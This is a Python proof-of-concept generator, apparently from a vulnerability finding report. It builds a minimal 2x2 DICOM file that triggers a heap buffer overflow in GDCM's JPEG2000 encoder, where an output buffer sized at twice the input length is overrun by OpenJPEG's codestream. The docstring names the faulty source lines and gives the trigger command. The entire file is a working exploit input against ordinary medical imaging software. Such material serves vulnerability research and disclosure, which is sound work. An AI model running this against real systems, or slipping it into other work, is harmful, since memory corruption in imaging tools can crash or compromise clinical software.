#!/usr/bin/env python3
"""
Finding 2 PoC generator - GDCM JPEG2000 encode heap overflow (CWE-787).

Bug: Source/MediaStorageAndFileFormat/gdcmJPEG2000Codec.cxx:1291
  char *buffer_j2k = new char[inputlength * 2];
For a 2x2 8-bit mono image, inputlength=4 -> buffer_j2k is only 8 bytes.
OpenJPEG's J2K codestream output is never that small (>=131 bytes even for
a trivial image), so the write callback overflows the heap buffer.

The overflow itself happens in opj_write_from_memory() (line 318): the
bounds check against p_file->len is commented out, so memcpy() writes the
full codestream regardless of buffer_j2k's actual size.

Trigger: gdcmconv --j2k poc.dcm out.dcm
"""

import struct
import os


def encode_tag(group, elem, vr, value_bytes):
    """Encode one DICOM data element (Explicit VR Little Endian)."""
    tag = struct.pack("<HH", group, elem)
    vr_bytes = vr.encode("ascii")
    length = len(value_bytes)

    long_vrs = {b"SQ", b"OB", b"OW", b"OF", b"SV", b"UC", b"UN", b"UR", b"UV", b"UT"}
    if vr_bytes in long_vrs:
        hdr = tag + vr_bytes + b"\x00\x00" + struct.pack("<I", length)
    else:
        hdr = tag + vr_bytes + struct.pack("<H", length)

    return hdr + value_bytes


def pad_str(s, pad_char=b" "):
    b = s if isinstance(s, bytes) else s.encode("ascii")
    if len(b) % 2 != 0:
        b += pad_char
    return b


def pad_null(b):
    if len(b) % 2 != 0:
        b += b"\x00"
    return b


def build_dicom(rows, cols, pixel_data, uid="1.2.3.4.5.6.7.8.9.1234567890.1"):
    """Build a minimal valid DICOM file (Explicit VR Little Endian)."""
    num_pixels = rows * cols
    assert len(pixel_data) == num_pixels, \
        f"pixel_data length {len(pixel_data)} != rows*cols {num_pixels}"

    # File Meta Information (Group 0002) -- always Explicit VR Little Endian
    ts_uid = b"1.2.840.10008.1.2.1"          # Explicit VR Little Endian
    sc_uid = b"1.2.840.10008.5.1.4.1.1.7"    # Secondary Capture

    meta_elems = b""
    meta_elems += encode_tag(0x0002, 0x0001, "OB", b"\x00\x01")        # File Meta Info Version
    meta_elems += encode_tag(0x0002, 0x0002, "UI", pad_null(sc_uid))   # Media Storage SOP Class UID
    meta_elems += encode_tag(0x0002, 0x0003, "UI", pad_null(uid.encode("ascii")))  # SOP Instance UID
    meta_elems += encode_tag(0x0002, 0x0010, "UI", pad_null(ts_uid))   # Transfer Syntax UID

    fmi_group_len = struct.pack("<I", len(meta_elems))
    fmi = encode_tag(0x0002, 0x0000, "UL", fmi_group_len) + meta_elems

    # Dataset -- Explicit VR Little Endian
    ds = b""
    ds += encode_tag(0x0008, 0x0016, "UI", pad_null(sc_uid))
    ds += encode_tag(0x0008, 0x0018, "UI", pad_null(uid.encode("ascii")))
    ds += encode_tag(0x0028, 0x0002, "US", struct.pack("<H", 1))              # SamplesPerPixel
    ds += encode_tag(0x0028, 0x0004, "CS", pad_str(b"MONOCHROME2"))           # PhotometricInterpretation
    ds += encode_tag(0x0028, 0x0010, "US", struct.pack("<H", rows))           # Rows
    ds += encode_tag(0x0028, 0x0011, "US", struct.pack("<H", cols))           # Columns
    ds += encode_tag(0x0028, 0x0100, "US", struct.pack("<H", 8))              # BitsAllocated
    ds += encode_tag(0x0028, 0x0101, "US", struct.pack("<H", 8))              # BitsStored
    ds += encode_tag(0x0028, 0x0102, "US", struct.pack("<H", 7))              # HighBit
    ds += encode_tag(0x0028, 0x0103, "US", struct.pack("<H", 0))              # PixelRepresentation
    ds += encode_tag(0x7FE0, 0x0010, "OW", pad_null(pixel_data))              # Pixel Data

    preamble = b"\x00" * 128 + b"DICM"
    return preamble + fmi + ds


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(script_dir, "poc.dcm")

    # 2x2 is the minimum exploitable size (1x1 is rejected by OpenJPEG:
    # numresolutions=0 is invalid). inputlength=4 -> buffer_j2k=8 bytes,
    # while OpenJPEG's actual codestream output is 132 bytes.
    rows, cols = 2, 2
    pixel_data = b"\xDE\xAD\xBE\xEF"

    data = build_dicom(rows, cols, pixel_data)
    with open(out_path, "wb") as f:
        f.write(data)

    input_length = rows * cols
    buffer_j2k_size = input_length * 2
    print(f"[+] {out_path}: {rows}x{cols} image, {len(data)} bytes")
    print(f"    inputlength={input_length} -> buffer_j2k={buffer_j2k_size} bytes (new char[inputlength*2])")
    print("    Trigger: gdcmconv --j2k poc.dcm out.dcm")


if __name__ == "__main__":
    main()
